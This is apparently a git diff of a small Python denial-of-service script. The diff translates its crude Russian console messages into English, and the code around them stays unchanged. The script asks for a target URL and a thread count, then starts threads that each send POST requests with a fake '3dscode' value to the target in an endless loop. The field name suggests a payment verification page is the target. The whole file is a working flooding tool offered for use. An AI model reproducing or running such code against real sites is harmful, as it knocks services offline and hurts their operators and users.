@@ -8,29 +8,29 @@ def dos(target):
     while True:
         try:
             res = requests.post(url, data={'3dscode': '666666',})
-            print("Код выслан")
+            print("code sent")
         except requests.exceptions.ConnectionError:
-            print("Cука пиздец гг")
+            print("ggwp")
 
 threads = 20
 
-url = input("Вставь ссылОчку ")
+url = input("target: ")
 
 try:
-    threads = int(input("Сколько потоков ебанем (только расчитывай на возможности своего кампухтера и инета): "))
+    threads = int(input("threads: "))
 except ValueError:
-    exit("ты дебил")
+    exit("u r dumb")
 
 if threads == 0:
-    exit("блять еблан")
+    exit("idiot")
 
 if not url.__contains__("http"):
-    exit("блять напиши домен фулл")
+    exit("provide full odmain plz")
 
 if not url.__contains__("."):
-    exit("еблан домен не тот")
+    exit("not that")
 
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
     thr.start()
-    print(str(i + 1) + " потоков запущено!")
+    print(str(i + 1) + " threads started!")
